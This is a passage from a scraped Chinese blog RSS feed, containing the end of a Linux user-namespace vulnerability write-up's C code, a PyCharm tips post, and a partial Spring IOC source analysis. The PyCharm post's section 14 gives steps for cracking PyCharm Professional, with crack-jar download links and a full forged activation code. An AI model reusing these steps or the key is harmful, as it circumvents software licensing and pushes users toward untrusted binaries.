        err(&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;open gid map&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (write(gid_map, id_mapping, strlen(id_mapping)) !=&lt;span&gt; strlen(id_mapping))
        err(&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;write gid map&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
    close(gid_map);
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (write(sync_pipe[&lt;span&gt;1&lt;/span&gt;], &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;X&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;1&lt;/span&gt;) != &lt;span&gt;1&lt;/span&gt;&lt;span&gt;)
        err(&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;write to sock&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);

    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; status;
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (wait(&amp;amp;status) !=&lt;span&gt; child)
        err(&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;wait&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

</description>
<pubDate>Wed, 08 May 2019 06:58:00 +0000</pubDate>
<dc:creator>番茄汁汁</dc:creator>
<og:description>简介 这是名称空间的漏洞，文章先介绍user namespaces的简单只是，然后从补丁入手，分析源码，找到漏洞出现的原因。因为对这块的源码不是那么熟悉，所以着重描述源码分析的部分，其他可以参考末尾的</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/likaiming/p/10816529.html</dc:identifier>
</item>
<item>
<title>每周分享五个 PyCharm 使用技巧（三） - 站在两个世界的边缘</title>
<link>http://www.cnblogs.com/wongbingming/p/10831760.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/wongbingming/p/10831760.html</guid>
<description>&lt;p&gt;大家好，这是本系列 PyCharm 的高效使用技巧的第三篇。按照惯例，本次还是分享 5 个。&lt;/p&gt;
&lt;h2 id=&quot;一键进行代码性能分析&quot;&gt;11. 一键进行代码性能分析&lt;/h2&gt;
&lt;p&gt;在 Python 中有许多模块可以帮助你分析并找出你的项目中哪里出现了性能问题。&lt;/p&gt;
&lt;p&gt;比如，常用的模块有 cProfile，在某些框架中，也内置了中间件帮助你进行性能分析，比如 Django ，WSGI。&lt;/p&gt;
&lt;p&gt;做为Python 的第一 IDE， PyCharm 本身就支持了这项功能。而且使用非常方便，小白。&lt;/p&gt;
&lt;p&gt;假设现在要分析如下这段代码的性能损耗情况，找出到底哪个函数耗时最多&lt;/p&gt;
&lt;pre class=&quot;python&quot;&gt;
&lt;code&gt;import time

def fun1():
    time.sleep(1)

def fun2():
    time.sleep(1)

def fun3():
    time.sleep(2)

def fun4():
    time.sleep(1)

def fun5():
    time.sleep(1)
    fun4()

fun1()
fun2()
fun3()
fun5()&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;点击 Run -&amp;gt; Profile '程序' ，即可进行性能分析。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://image.python-online.cn/20190507222856.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;运行完毕后，会自动跳出一个性能统计界面。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://image.python-online.cn/20190507222119.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;性能统计界面由Name、Call Count、Time(ms)、Own Time(ms) ，4列组成一个表格，见下图。&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;表头Name显示被调用的模块或者函数；Call Count显示被调用的次数；Time(ms)显示运行时间和时间百分比，时间单位为毫秒（ms）。&lt;/li&gt;
&lt;li&gt;点击表头上的小三角可以升序或降序排列表格。&lt;/li&gt;
&lt;li&gt;在Name这一个列中双击某一行可以跳转到对应的代码。&lt;/li&gt;
&lt;li&gt;以fun4这一行举例：fun4被调用了一次，运行时间为1000ms，占整个运行时间的16.7%&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;点击 Call Graph（调用关系图）界面直观展示了各函数直接的调用关系、运行时间和时间百分比，见下图。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://image.python-online.cn/20190507223313.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;右上角的4个按钮表示放大、缩小、真实大小、合适大小；&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;箭头表示调用关系，由调用者指向被调用者；&lt;/li&gt;
&lt;li&gt;矩形的左上角显示模块或者函数的名称，右上角显示被调用的次数；&lt;/li&gt;
&lt;li&gt;矩形中间显示运行时间和时间百分比；&lt;/li&gt;
&lt;li&gt;矩形的颜色表示运行时间或者时间百分比大小的趋势：红色 &amp;gt; 黄绿色 &amp;gt; 绿色，由图可以看出fun3的矩形为黄绿色，fun1为绿色，所有fun3运行时间比fun1长。&lt;/li&gt;
&lt;li&gt;从图中可以看出Test.py直接调用了fun3、fun1、fun2和fun5函数；fun5函数直接调用了fun4函数；fun1、fun2、fun3、fun4和fun5都直接调用了print以及sleep函数；整个测试代码运行的总时间为6006ms，其中fun3的运行时间为1999ms，所占的时间百分比为33.3%，也就是 1999ms / 6006ms = 33.3%。&lt;/li&gt;
&lt;/ol&gt;&lt;h2 id=&quot;使用git做版本控制&quot;&gt;12. 使用Git做版本控制&lt;/h2&gt;
&lt;p&gt;按照如下提示点击 Git 仓库配置&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://image.python-online.cn/20190507215525.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;接着输入仓库地址&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://image.python-online.cn/20190507220101.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;点击 Test，测试连通性，会要求输入密码&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://image.python-online.cn/20190419152120.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;若一切顺利，则会看到如下界面&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://image.python-online.cn/20190419152145.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;测试连接成功后，点击 Clone 就可以克隆下来了。&lt;/p&gt;
&lt;p&gt;对于以前使用 Git 命令来管理的，现在可以直接使用 PyCharm 的菜单栏来操作，这些功能已经可以满足大多数人的日常需求了，应该是够用了。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://image.python-online.cn/20190507220740.png&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;tab轻松转空格&quot;&gt;13 Tab轻松转空格&lt;/h2&gt;
&lt;p&gt;在团队协作中，你难免会动到别人编辑的文件，有的人喜欢做tab做缩进，有的人喜欢用四个空格做缩进。&lt;/p&gt;
&lt;p&gt;但是在同一个Python文件模块里，tab 和 四个空格缩进两种风格是不能共存的。这就需要你按照该文件原来的缩进风格来进行编码，在 Pycharm 里，可以设置自动检测原文件的缩进风格来决定当你使用tab键缩进的时候，是TAB还是四个空格。&lt;/p&gt;
&lt;p&gt;在图示位置打勾即可开启自动检测。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://image.python-online.cn/20190423162328.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;上面是对一个旧的 Python 模块进行修改时，如何决定当前编辑的缩进方式。&lt;/p&gt;
&lt;p&gt;而对于新建模块，默认的缩进方式，是如何确定的？&lt;/p&gt;
&lt;p&gt;如下图，若在 &lt;code&gt;Use tab character&lt;/code&gt; 打上勾，则你新建一个 Python 后，就会使用 TAB 进行缩进，反之，则使用四个空格进行缩进。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://image.python-online.cn/20190423163341.png&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;一次注册永久激活&quot;&gt;14. 一次注册，永久激活&lt;/h2&gt;
&lt;p&gt;PyCharm 有分两个版本，一个是社区版（免费功能有限），一个是专业版（有一些增强功能），详细差异你可以参考这个图，一般来说，社区版用作学习用途是没有问题的。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://image.python-online.cn/20190506150523.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;如果需要使用专业版，网上也有一些注册服务器使用，非常方便，缺点是过一段时间，可能就会失效。这里有一种一劳永逸的方法，但可能仅对早期的 PyCharm 版本有效，可以实现永久激活（到 2099 / 2100年，一定意义上是永久了吧）。&lt;/p&gt;
&lt;p&gt;经过我个人亲测，以下破解jar包，Windows 中在 2017.1.5 版本中有效，Mac OS 在2018.2.4 版本中有效。如果你在自己的版本中尝试无效，可以尝试切换至我的版本。&lt;/p&gt;
&lt;p&gt;以下将分别以 Mac OS 和 Windows两个主流系统做演示。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第一步&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;下载jar包： 此jar包的目的就是让截获截止时间并骗过 PyCharm;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://pan.baidu.com/s/1dwhT6ptvi3j45i4sSZLvVA&quot;&gt;Windows 点此下载&lt;/a&gt; 密码:lvyv&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://pan.baidu.com/s/1dwhT6ptvi3j45i4sSZLvVA&quot;&gt;Mac OS 点此下载&lt;/a&gt;，密码:5o4s&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第二步&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;若是 Windows 系统，请找到并进入你的 PyCharm 安装启动目录（以我的为例）：E:\Program Files\JetBrains\PyCharm 2017.1.5\bin&lt;/p&gt;
&lt;p&gt;将第一步下载的 jar 包放入这个目录，并打开如下两个以 &lt;code&gt;vmoptions&lt;/code&gt; 后缀结尾的文件：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://image.python-online.cn/20190506150010.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;添加如下这一行（请根据你的实际安装目录自行调整）&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://image.python-online.cn/20190506150100.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;若是 Mac OS 系统，请找到并进入你的 Pycharm 安装启动目录（以我的为例）&lt;/p&gt;
&lt;p&gt;将第一步下载的 jar 包放入这个目录&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://image.python-online.cn/20190507000850.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;并打开如下一个以 &lt;code&gt;vmoptions&lt;/code&gt; 后缀结尾的文件：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://image.python-online.cn/20190507001025.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第三步&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;随意填写个激活码，如果此前已经有写过，这步可直接跳过到第四步，如果没有写过，你就填这个吧。&lt;/p&gt;
&lt;p&gt;点击：Help -&amp;gt; Register -&amp;gt; Activation Code&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;BIG3CLIK6F-eyJsaWNlbnNlSWQiOiJCSUczQ0xJSzZGIiwibGljZW5zZWVOYW1lIjoibGFuIHl1IiwiYXNzaWduZWVOYW1lIjoiIiwiYXNzaWduZWVFbWFpbCI6IiIsImxpY2Vuc2VSZXN0cmljdGlvbiI6IkZvciBlZHVjYXRpb25hbCB1c2Ugb25seSIsImNoZWNrQ29uY3VycmVudFVzZSI6ZmFsc2UsInByb2R1Y3RzIjpbeyJjb2RlIjoiQUMiLCJwYWlkVXBUbyI6IjIwMTctMTEtMjMifSx7ImNvZGUiOiJETSIsInBhaWRVcFRvIjoiMjAxNy0xMS0yMyJ9LHsiY29kZSI6IklJIiwicGFpZFVwVG8iOiIyMDE3LTExLTIzIn0seyJjb2RlIjoiUlMwIiwicGFpZFVwVG8iOiIyMDE3LTExLTIzIn0seyJjb2RlIjoiV1MiLCJwYWlkVXBUbyI6IjIwMTctMTEtMjMifSx7ImNvZGUiOiJEUE4iLCJwYWlkVXBUbyI6IjIwMTctMTEtMjMifSx7ImNvZGUiOiJSQyIsInBhaWRVcFRvIjoiMjAxNy0xMS0yMyJ9LHsiY29kZSI6IlBTIiwicGFpZFVwVG8iOiIyMDE3LTExLTIzIn0seyJjb2RlIjoiREMiLCJwYWlkVXBUbyI6IjIwMTctMTEtMjMifSx7ImNvZGUiOiJEQiIsInBhaWRVcFRvIjoiMjAxNy0xMS0yMyJ9LHsiY29kZSI6IlJNIiwicGFpZFVwVG8iOiIyMDE3LTExLTIzIn0seyJjb2RlIjoiUEMiLCJwYWlkVXBUbyI6IjIwMTctMTEtMjMifSx7ImNvZGUiOiJDTCIsInBhaWRVcFRvIjoiMjAxNy0xMS0yMyJ9XSwiaGFzaCI6IjQ3NzU1MTcvMCIsImdyYWNlUGVyaW9kRGF5cyI6MCwiYXV0b1Byb2xvbmdhdGVkIjpmYWxzZSwiaXNBdXRvUHJvbG9uZ2F0ZWQiOmZhbHNlfQ==-iygsIMXTVeSyYkUxAqpHmymrgwN5InkOfeRhhPIPa88FO9FRuZosIBTY18tflChACznk3qferT7iMGKm7pumDTR4FbVVlK/3n1ER0eMKu2NcaXb7m10xT6kLW1Xb3LtuZEnuis5pYuEwT1zR7GskeNWdYZ0dAJpNDLFrqPyAPo5s1KLDHKpw+VfVd4uf7RMjOIzuJhAAYAG+amyivQt61I9aYiwpHQvUphvTwi0X0qL/oDJHAQbIv4Qwscyo4aYZJBKutYioZH9rgOP6Yw/sCltpoPWlJtDOcw/iEWYiCVG1pH9AWjCYXZ9AbbEBOWV71IQr5VWrsqFZ7cg7hLEJ3A==-MIIEPjCCAiagAwIBAgIBBTANBgkqhkiG9w0BAQsFADAYMRYwFAYDVQQDDA1KZXRQcm9maWxlIENBMB4XDTE1MTEwMjA4MjE0OFoXDTE4MTEwMTA4MjE0OFowETEPMA0GA1UEAwwGcHJvZDN5MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxcQkq+zdxlR2mmRYBPzGbUNdMN6OaXiXzxIWtMEkrJMO/5oUfQJbLLuMSMK0QHFmaI37WShyxZcfRCidwXjot4zmNBKnlyHodDij/78TmVqFl8nOeD5+07B8VEaIu7c3E1N+e1doC6wht4I4+IEmtsPAdoaj5WCQVQbrI8KeT8M9VcBIWX7fD0fhexfg3ZRt0xqwMcXGNp3DdJHiO0rCdU+Itv7EmtnSVq9jBG1usMSFvMowR25mju2JcPFp1+I4ZI+FqgR8gyG8oiNDyNEoAbsR3lOpI7grUYSvkB/xVy/VoklPCK2h0f0GJxFjnye8NT1PAywoyl7RmiAVRE/EKwIDAQABo4GZMIGWMAkGA1UdEwQCMAAwHQYDVR0OBBYEFGEpG9oZGcfLMGNBkY7SgHiMGgTcMEgGA1UdIwRBMD+AFKOetkhnQhI2Qb1t4Lm0oFKLl/GzoRykGjAYMRYwFAYDVQQDDA1KZXRQcm9&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;第四步&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;若是 Windows 系统，重启 PyCharm 后，查看激活信息：Help -&amp;gt; About&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://image.python-online.cn/20190507001422.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;如果是 Mac OS 系统，重启 PyCharm 后，查看激活信息：PyCharm -&amp;gt; About PyCharm&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://image.python-online.cn/20190507001350.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;另外，以上仅做交流和个人学习使用，请勿商用，有能力的朋友还是希望多支持正版！&lt;/p&gt;
&lt;h2 id=&quot;源码文档快速预览&quot;&gt;15. 源码文档，快速预览&lt;/h2&gt;
&lt;p&gt;Ctrl + 鼠标左键 （Mac 上是：Command + 鼠标左键），可以实现函数跳转查看源码， 这几乎是每一个 PyCharmer 都会的一个惯用技巧。&lt;/p&gt;
&lt;p&gt;这里再另外介绍两个类似的小技巧，快速 &lt;code&gt;查看函数文档&lt;/code&gt; 和 &lt;code&gt;预览源代码&lt;/code&gt; 。&lt;/p&gt;
&lt;p&gt;在函数的开头处，使用三个引号 &lt;code&gt;&quot;&lt;/code&gt; 包含的内容，叫做函数文档 （DocString）。&lt;/p&gt;
&lt;p&gt;在编写代码时，顺便写好函数的接口文档，是一个很好的编码习惯。它介绍了该函数的参数类型及说明，返回值类型及范例，写得好一点的还会写出 几个简单的 Example Usage 有助于理解使用。在这一点上，Flask 可以说做得相当好。这边随便截一个 Werkzeug 的例子。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://image.python-online.cn/20190507152911.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;假如我们在使用这个类的时候，忘记了这个用法，可以按住 Ctrl + q（Mac暂时未找到对应快捷键），在当前页面就可以快速预览 LocalStack 的接口文档。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://image.python-online.cn/20190507152840.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;同样的，如果你对这个类或者函数的代码逻辑感兴趣，也可以使用快速预览的方式在当前页面展示源代码。快捷键是：Ctrl + shift + i （Mac：Command + shift + i）。效果如下&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://image.python-online.cn/20190507153847.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;如果 PyCharm 检测到的同名函数有多个，可以点这里进行选择查看&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://image.python-online.cn/20190507154027.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这两个快捷键比起使用 Ctrl + 鼠标左键 跳进源代码来说，更加方便，，就像微信小程序一样，用完即焚，不会新产生一个标签页，也不需要来回跳转页面。&lt;/p&gt;
&lt;hr/&gt;&lt;p&gt;&lt;img src=&quot;https://ws1.sinaimg.cn/large/8f640247gy1fyi60fxos4j20u00a8tdz.jpg&quot; alt=&quot;关注公众号，获取最新干货！&quot;/&gt;&lt;/p&gt;
</description>
<pubDate>Wed, 08 May 2019 06:42:00 +0000</pubDate>
<dc:creator>站在两个世界的边缘</dc:creator>
<og:description>大家好，这是本系列 PyCharm 的高效使用技巧的第三篇。按照惯例，本次还是分享 5 个。 11. 一键进行代码性能分析 在 Python 中有许多模块可以帮助你分析并找出你的项目中哪里出现了性能问</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/wongbingming/p/10831760.html</dc:identifier>
</item>
<item>
<title>【Spring源码解析】—— 结合SpringMVC过程理解IOC容器初始化之注解部分探究 - 可可_小虾米</title>
<link>http://www.cnblogs.com/keke-xiaoxiami/p/10773017.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/keke-xiaoxiami/p/10773017.html</guid>
<description>&lt;p&gt;&lt;span&gt;前面的文章写了xml中直接配置bean进行IOC的过程解析，接下来会针对注解进行IOC容器初始化的过程解析&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;因为会与之前的内容存在部分重叠，因此会针对相同的部分简略带过，针对不同的部分做重点说明：&lt;/span&gt;&lt;/p&gt;

&lt;h2&gt;&lt;span&gt;一、Xml的配置和代码中的注解配置：&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;applicationContext.xml配置添加：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&amp;lt;&lt;strong&gt;context&lt;/strong&gt;&lt;strong&gt;:component-scan&lt;/strong&gt; &lt;strong&gt;base-package&lt;/strong&gt;&lt;strong&gt;=&quot;cn.lx.controller&quot;&lt;/strong&gt; /&amp;gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;代码中配置注解修改：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;@Controller

&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; TestController {

    @RequestMapping(&lt;/span&gt;&quot;/test.form&quot;&lt;span&gt;)

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; execute(){

        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; ;

    }

}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;&lt;span&gt;二、详解：&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;入口部分：ContextLoaderListener类中的contextInitialized&lt;/span&gt;&lt;span&gt;，进入到ContextLoader类的initWebApplicationContext&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;方法中，该方法中执行的关键方法是：configureAndRefreshWebApplicationContext()进入到ConfigurableWebApplicationContext&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;类的实例wac.refresh()调用中，至此进入到具体接下来的load阶段了&lt;/span&gt;&lt;/p&gt;
&lt;h3&gt;&lt;span&gt;load过程：&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;&lt;span&gt;进入到AbstractApplicationContext类的refresh()类中，之后进入到ObtainFreshBeanFactory()方法中，一路往下跟进到实现方法，之后进入到：AbstractRefreshableApplicationContext类中的refreshBeanFactory()方法，在此方法中，进行CreateFactory()会得到DefaultListableBeanFactory类的一个实例beanFactory，之后会作为方法参数传入到loadBeanDefinitions(beanFactory)中，这里其实就是能明显看到有load字眼啦，继续一步步往下跟进，进入到真正做事情的方法就是doLoadBeanDefinitions中，这里会生成一个BeanDefinitionDocumentReader类的实例，之后通过该实例调用方法registerBeanDefinitions，依然是要进入到真正做事的doRegisterBeanDefinitions方法中，至此就马上到了process的部分了，在这个部分会针对传入的元素进行解析前、中、后的处理，我们进入到解析中的方法：parseBeanDefinitions(root, &lt;strong&gt;this&lt;/strong&gt;.&lt;strong&gt;delegate&lt;/strong&gt;)，在解析的方法中，会判断如果是bean相关namespace的，则会parseDefaultElement，因为这里是注解的形式，因此其nameSpace不为默认的bean相关的，而是Context的，因此进入到：delegate.parseCustomElement(ele)中，接下来就是具体基于注解进行解析的部分了，即process过程&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;具体可见下方代码：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;protected&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; parseBeanDefinitions(Element root, BeanDefinitionParserDelegate delegate) {
   &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;判断节点是否属于同一命名空间，是则执行后续的解析&lt;/span&gt;
   &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (delegate.isDefaultNamespace(root)) {
      NodeList nl &lt;/span&gt;=&lt;span&gt; root.getChildNodes();
      &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (&lt;span&gt;int&lt;/span&gt; i = 0; i &amp;lt; nl.getLength(); i++&lt;span&gt;) {
         Node node &lt;/span&gt;=&lt;span&gt; nl.item(i);
         &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (node &lt;span&gt;instanceof&lt;/span&gt;&lt;span&gt; Element) {
            Element ele &lt;/span&gt;=&lt;span&gt; (Element) node;
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (delegate.isDefaultNamespace(ele)) {
               parseDefaultElement(ele, delegate);
            }
            &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
               &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;注解定义的Context的nameSpace进入到这个分支中&lt;/span&gt;
&lt;span&gt;               delegate.parseCustomElement(ele);
            }
         }
      }
   }
   &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
      delegate.parseCustomElement(root);
   }
}

 &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;&lt;span&gt;process过程：&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;&lt;span&gt;具体process过程做了哪些事情呢？可分为两个步骤来说明，首先根据ele的定义得到key，通过key返回对应的namespaceUri，之后根据namespaceUri的解析得到一个NameSpaceHandler的实例handler，之后由具体实现了NameSpaceHandler接口的类NameSpaceHandlerSupport类进行的方法调用，即parse方法的调用，即离具体的解析更进一步啦~&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;可见下方代码注释部分：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
&lt;pre&gt;
&lt;span&gt;//&lt;/span&gt;&lt;span&gt;常规解析方法&lt;/span&gt;
&lt;span&gt;@Nullable
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; BeanDefinition parseCustomElement(Element ele, @Nullable BeanDefinition containingBd) {
   &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;获取namespaceUri，例如xml中配置的如果是&amp;lt;context:componet-scan base-packages:xxx&amp;gt;
   &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;这里的ele会得到component-scan，并且值为null，namespaceUri为 &lt;/span&gt;&lt;span&gt;http://www.springframework.org/schema/context&lt;/span&gt;
   String namespaceUri =&lt;span&gt; getNamespaceURI(ele);
   &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (namespaceUri == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) {
      &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
   }
   &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;基于namespaceUri得到handler，得到handler之后，不同的handler实现了parse方法，到具体的parse去进行调用和处理
   &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;因为Handler为：org.springframework.context.config.ContextNamespaceHandler
   &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;在resolve的init操作中直接将component-scan的key和对应的ComponentScanBeanDefinitionParser的实例放入到了parser的map中&lt;/span&gt;
   NamespaceHandler handler = &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.readerContext.getNamespaceHandlerResolver().resolve(namespaceUri);
   &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (handler == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) {
      error(&lt;/span&gt;&quot;Unable to locate Spring NamespaceHandler for XML schema namespace [&quot; + namespaceUri + &quot;]&quot;&lt;span&gt;, ele);
      &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
   }
   &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;NameSpaceHandler是接口，具体这里调用的就是得到的handler的实际类型，通过它进行parse调用
   &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;实现该Handler的类是：NamespaceHandlerSupport&lt;/span&gt;
   &lt;span&gt;return&lt;/span&gt; handler.parse(ele, &lt;span&gt;new&lt;/span&gt; ParserContext(&lt;span&gt;this&lt;/span&gt;.readerContext, &lt;span&gt;this&lt;/span&gt;&lt;span&gt;, containingBd));
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;下面继续说明一下通过namespaceUri的resolve具体是如何实现的的？接下来是对这里的详细说明：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;首先&lt;strong&gt;this&lt;/strong&gt;.&lt;strong&gt;readerContext&lt;/strong&gt;.getNamespaceHandlerResolver()返回内容为：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;final&lt;/span&gt;&lt;span&gt; NamespaceHandlerResolver getNamespaceHandlerResolver() {
   &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.namespaceHandlerResolver;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;注意这里定义的是final，final的方法不能被重写，因为返回的是NamespaceHandlerResolver，发现其是一个接口，因此直接找实现类，点击resolve找到对应的实现类DefaultNamespaceHandler(注意这里又体现了，最终真的去做事情的，很多都会被命名为Defaultxxx类，或者Simplexxx类)对该方法的实现，resolve中所做事项就是判定是否已有可用解析类，若无则进行初始化init操作，并且返回handler实例&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;41&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt;&lt;span&gt; NamespaceHandler resolve(String namespaceUri) {
      &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;先通过handlerMappings的配置进行get获取，针对传入的namespaceUri是否存在handler可供使用&lt;/span&gt;
      Map&amp;lt;String, Object&amp;gt; handlerMappings =&lt;span&gt; getHandlerMappings();
